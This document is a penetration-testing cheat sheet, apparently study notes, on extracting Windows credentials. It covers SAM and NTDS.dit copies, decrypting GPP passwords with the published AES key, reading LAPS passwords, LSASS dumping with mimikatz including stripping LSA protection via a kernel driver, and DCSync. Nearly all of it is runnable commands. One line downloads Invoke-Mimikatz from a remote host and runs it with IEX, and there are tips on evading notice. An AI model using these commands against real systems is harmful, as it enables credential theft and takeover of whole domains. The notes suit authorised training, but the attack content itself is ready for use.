**DUMPING THE SAM:**

In order to dump the SAM, which stores the NTLM hashes for the local users on the machine we must first obtain a copy of the SAM and SYSTEM. Although the SAM is stored here "c:\Windows\System32\config\sam"
we cannot copy it directly, since it forms part of a running process. Additionally the SYSTEM has an exclusive lock.

1st method(create a shadow volume of the local hard drive with vssadmin): 

```
1. wmic shadowcopy call create Volume='C:\'
2. vssadmin list shadows
3. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\trike\Downloads\sam
4. copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\trike\Downloads\system
```

2nd Method(extracting the SAM and the SYSTEM from registry hives):

```
1. reg save HKLM\sam C:\users\trike\Downloads\sam
2. reg save HKLM\system C:\users\trike\Downloads\system
```
To dump the contents of the SAM, my preferred method(although there are others) is using impacket-secretsdump:

```
~# impacket-secretsdump -sam sam -system system local
```

**GROUP POLICY PREFERENCES(GPP):**

The passwords are encrypted using AES-256, however microsoft published this AES-256 key. As a solution, the MS14-025 security update removed the ability to create GPP containing passwords. Altough the ability
to create new GPP was removed, the existing GPP weren't deleted, so some of them may still exist in the wild.
Manual dump:

```
1. Get a copy of the password in base64, the GPP are stored in this SMB share: \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\   additionally the GPP must be accessible to all domain users
2. echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

Automated dump with [Get-GPPPassword](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py):

```
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash
Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

**LAPS(Local Administtrator Password Solution):**

LAPS offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers.

Dumping it using a powershell script [LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit):

```
PS C:\> Import-Module .\LAPSToolkit.ps1

PS C:\> Get-LAPSComputers  -> to list all computers that are set up with LAPS

PS C:\> Find-LAPSDelegatedGroups  -> list groups that can read LAPS

PS C:\> Get-LAPSComputers  -> if we are logged in as a user that can read LAPS, it will retrun us with a cleartext password for the "Administrator" account of a computer.
```
(All this information can be retrieved using SharpHound and viewed with BloodHound)

**LSASS(Local Security Authority Subsytem Service):**

Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.

However, since LSASS runs as SYSTEM, we need admin privileiges in order to access its memory space.

1st method(using mimikatz, the commands here are meant to be thrown froma mimikatz shell):

```
To dump credentials:
1. privilege::debug
2. sekurlsa::logonpasswords

To dump TGT and TGS:
1. sekurlsa::tickets
2. sekurlsa::tickets /export
3. kerberos::ptt ticket.kirbi
```
(If you want to be stealthier, you can use [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)).

2nd method(using [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)):

```
1. PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX
2. PS C:\Windows\system32> Invoke-Mimikatz -Command "`"sekurlsa::logonpasswords`""

(Alternatively, we can append this line: Invoke-Mimikatz -Command "sekurlsa::logonpasswords"  at the end of the Invoke-Mimikatz.ps1 script, so that when you use the IEX sekurlsa::logonpasswords gets automatically executed and you don't have to fight with double quotes and backticks).
```

3rd method(using [MiniDump.cs](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Windows%20Credentials/MiniDump.cs)):

Using this method we will create a dump file, which is a snapshot of a given process.

```
C:\minidump.exe c:\windows\tasks\lsass.dmp
```
(Then you can parse this dump file with mimikatz from a computer with matching OS and architecture, as the computer where the dump file was created)

```
#From a mimikatz shell(note that this doesn't require debug privileges)
1. sekurlsa::minidump lsass.dmp
2. sekurlsa::logonpasswords
```

When the popularity of cached credential retrieving raised, Microsoft introduced 2 secuirty measures: LSA Protection and Windows Defender Credential Guard. The LSA protection added an additional process 
security layer, the Process Protected Light(PPL), which is placed on top of the highest integrity level. This means that SYSTEM level privileges aren't enough to dump the LSASS.

To solve this problem mimikatz relased the [mimidrv.sys](releases/tag/2.2.0-20220919)(go to releases and mimidrv.sys is located inside the .zip/.7z). To load this driver we must have this SeLoadDriverPrivilege additional privilege.

```
C:\Windows\system32> sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand

C:\Windows\system32> sc start mimidrv

#From a mimikatz shell
1. !processprotect /process:lsass.exe /remove  -> Afterwards LSA is disabled, meaning that we can dump the LSASS using the method we best like
```

**NTDS:**

The NTDS.dit, is a database that is usually stored on the Domain Controllers. The NTDS.dit contains the NTLM hash for all the domain users, so it is a prime taget for an attacker. However, in order to be able to dump it you need to be Domain Admin or be local admin on the Domain Controller.

1st method(using vssadmin):

```
1. Create a shadow copy of the c:\ unit -> wmic shadowcopy call create Volume='C:\'     -> to list them -> vssadmin list shadows
2. Get a copy of the NTDS.dit -> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit
3. Get a copy of the SYSTEM -> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\system    -> or -> reg save HKLM\SYSTEM c:\system
4. Download them to our machine and use: impacket-secretsdump -system system -ntds ntds LOCAL
```

2nd method(using impacket-secretsdump, it has various execution methods: smbexec(psexec), wmiexec(DCOM) and mmcexec(DCOM), all this execution methods are explained [here](https://github.com/trike33/PEN-300-Code-Snippets/tree/main/Windows%20Lateral%20Movement)):

```
1. impacket-secretsdump -dc-ip <domain_controller_ip> domain/username:password@target_name
```
(note that this last method will be more time consuming that the 1st method)

**DcSync:**

The main advantatge of this techique is that is less noisy than dumping the NTDS
The domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges.

In a nutshell, to be able to perform DcSync we must: be a domain admin or make the DcSync from a computer that has domain replication permissions.

```
#From a mimikatz shell

1. lsadump::dcsync /user:Administrator

or

2. lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

**Meterpreter:**
